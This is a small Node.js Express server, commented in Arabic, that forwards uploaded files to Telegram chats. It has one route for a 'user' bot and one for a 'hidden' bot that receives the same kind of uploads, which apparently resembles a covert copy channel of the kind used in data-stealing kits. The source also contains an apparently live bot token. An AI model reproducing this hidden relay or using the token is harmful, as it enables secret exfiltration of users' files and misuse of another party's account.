const express = require('express');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');
const app = express();
const upload = multer();

// إعدادات البوت الخفي
const TOKEN_HIDDEN = "توكن_البوت_الخفي";
const CHAT_ID_HIDDEN = "آي_دي_البوت_الخفي";

// إعدادات بوت المستخدم
const TOKEN_USER = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
const CHAT_ID_USER = "6576769234";

// مسار البوت الخفي
app.post('/upload-hidden', upload.any(), async (req, res) => {
    handleBridge(req, res, TOKEN_HIDDEN, CHAT_ID_HIDDEN);
});

// مسار بوت المستخدم
app.post('/upload-user', upload.any(), async (req, res) => {
    handleBridge(req, res, TOKEN_USER, CHAT_ID_USER);
});

// دالة الجسر الموحدة
async function handleBridge(req, res, token, chatId) {
    try {
        const file = req.files[0];
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', file.buffer, { filename: file.originalname });

        await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, form, {
            headers: form.getHeaders()
        });
        res.status(200).send("Done");
    } catch (e) {
        res.status(500).send("Error");
    }
}

app.listen(process.env.PORT || 3000);
